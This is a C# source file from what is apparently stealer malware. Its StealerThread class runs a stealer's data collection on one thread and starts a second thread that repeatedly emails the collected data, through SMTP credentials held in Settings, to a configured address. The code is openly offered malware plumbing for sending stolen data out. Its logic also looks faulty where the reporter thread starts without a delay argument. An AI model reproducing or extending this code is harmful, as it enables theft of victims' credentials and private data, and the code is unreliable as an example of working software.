using System.Threading;
using System.Windows.Forms;
using sub.Stealers;

namespace sub
{
    internal class StealerThread
    {
        private Thread _stealer;
        private Thread _reporter;

        public StealerThread(IStealer stealer)
        {
            _stealer = new Thread(stealer.Collect);
            _reporter = new Thread(delegate(object delay)
                                       {
                                           while (true)
                                           {
                                               Thread.Sleep((int) delay);
                                               MessageBox.Show(stealer.Data);
                                               new ReportEmail(stealer.GetType().Name, Settings.EmailAddress,
                                                               Settings.EmailPassword,
                                                               Settings.SmtpAddress, Settings.SmtpPort).Send(stealer.Data);
                                           }
                                       });
        }

        public void Start(int param)
        {
            _stealer.Start();
            if (param != -1)
            {
                _reporter.Start(param*60000); //This will change it to minutes
            } 
            else
            {
                _reporter.Start();
            }
        }

        public Thread GetStealerThread()
        {
            return _stealer;
        }

        public Thread GetReporterThread()
        {
            return _reporter;
        }
    }
}